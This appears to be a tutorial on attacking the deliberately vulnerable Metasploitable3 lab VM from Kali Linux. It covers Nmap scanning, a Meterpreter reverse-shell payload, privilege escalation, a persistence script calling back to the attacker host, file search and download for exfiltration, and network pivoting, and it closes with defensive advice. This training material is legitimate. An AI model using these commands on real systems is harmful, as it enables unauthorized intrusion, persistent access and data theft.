Exploitation and Post Exploitation with Metasploitable

This article demonstrates penetration testing techniques using Metasploitable3, a deliberately vulnerable Windows virtual machine designed for security training. We'll explore exploitation and post-exploitation phases using Kali Linux as our attacking platform.

Virtual Machine Setup

We configured our virtual machines with the following network parameters:

  • Network Configuration: NAT Network 192.168.100.0/24
  • Kali Linux IP: 192.168.100.4
  • Metasploitable3 Windows IP: 192.168.100.5

Network Reconnaissance

The first step in any penetration test is reconnaissance. We begin by discovering live hosts and identifying open services on the target machine.

Host Discovery

Using Nmap to discover active hosts in our network segment: 

nmap -sn 192.168.100.0/24

This ping scan helps us identify which IP addresses are responding and available for further enumeration.

Port Scanning

Once we've identified our target (192.168.100.5), we perform a comprehensive port scan to identify running services: 

nmap -sS -sV -O -A 192.168.100.5

This scan reveals open ports, service versions, and operating system information that will guide our exploitation strategy.

Vulnerability Assessment

After identifying open services, we analyze them for known vulnerabilities. Metasploitable3 intentionally contains numerous security flaws including:

  • Outdated services with known CVEs
  • Weak authentication mechanisms
  • Misconfigured applications
  • Unpatched system vulnerabilities

Exploitation Phase

Using the Metasploit Framework, we can exploit identified vulnerabilities to gain initial access to the target system.

Metasploit Framework

Launch Metasploit and search for relevant exploits: 

msfconsole
search metasploitable3
search type:exploit platform:windows

Exploit Selection and Configuration

Select an appropriate exploit module and configure the required parameters: 

use exploit/windows/[specific_exploit]
set RHOSTS 192.168.100.5
set LHOST 192.168.100.4
set payload windows/meterpreter/reverse_tcp

Post-Exploitation Activities

Once we've successfully exploited the target and established a Meterpreter session, we can perform various post-exploitation activities to demonstrate the impact of the compromise.

System Information Gathering

Collect detailed information about the compromised system: 

sysinfo
getuid
ps
netstat

Privilege Escalation

Attempt to escalate privileges to gain administrative access: 

getsystem
getprivs

Persistence Mechanisms

Establish persistence to maintain access across system reboots: 

run persistence -S -U -X -i 5 -p 4444 -r 192.168.100.4

Data Extraction

Search for and extract sensitive information: 

search -f *.txt
search -f *.pdf
search -f *.doc*
download [filename]

Network Lateral Movement

From the compromised system, we can attempt to discover and attack other systems in the network: 

run post/windows/gather/arp_scanner RHOSTS=192.168.100.0/24
route add 192.168.100.0 255.255.255.0 [session_id]
use auxiliary/scanner/portscan/tcp

Evidence Collection

Document all findings with screenshots and command outputs to create a comprehensive penetration testing report. This includes:

  • Network topology and discovered hosts
  • Identified vulnerabilities and their severity
  • Successful exploitation attempts
  • Post-exploitation activities performed
  • Data accessed or exfiltrated
  • Recommended remediation steps

Defensive Countermeasures

Understanding these attack techniques helps in implementing proper defensive measures:

  • Regular Security Updates: Keep all systems and applications patched
  • Network Segmentation: Limit lateral movement capabilities
  • Access Controls: Implement principle of least privilege
  • Monitoring: Deploy comprehensive logging and intrusion detection
  • Employee Training: Educate users about social engineering attacks

Conclusion

This exercise demonstrates the complete attack lifecycle from reconnaissance to post-exploitation. Metasploitable3 provides an excellent platform for learning penetration testing techniques in a controlled environment. Understanding these attack vectors is crucial for cybersecurity professionals to better defend their organizations against real-world threats.

Remember that these techniques should only be used in authorized testing environments or with explicit permission. Unauthorized use of these methods against systems you don't own is illegal and unethical.
